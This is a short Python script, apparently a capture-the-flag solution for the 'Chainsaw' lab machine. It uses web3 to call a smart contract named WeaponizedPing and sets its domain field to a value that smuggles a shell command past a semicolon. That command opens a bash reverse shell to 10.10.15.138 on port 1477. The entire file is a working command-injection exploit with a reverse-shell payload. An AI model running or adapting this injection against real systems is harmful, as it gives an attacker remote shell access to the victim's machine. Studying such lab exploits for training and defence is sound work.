from web3 import Web3,eth
import json

infura_url = "http://chainsaw.htb:9810"
web3 = Web3(Web3.HTTPProvider(infura_url))
web3.eth.defaultAccount = web3.eth.accounts[0]

address = open("../21_files/address.txt", "r").read().replace("\n","")

with open('../21_files/WeaponizedPing.json') as f:
	data = json.load(f)

url = web3.eth.contract(abi=data['abi'], bytecode=data['bytecode'])
instance = web3.eth.contract(address=address, abi=data['abi'])

print(instance.functions.getDomain().call())
instance.functions.setDomain("g147;bash -c 'bash -i >& /dev/tcp/10.10.15.138/1477 0>&1'").transact()
print(instance.functions.getDomain().call())

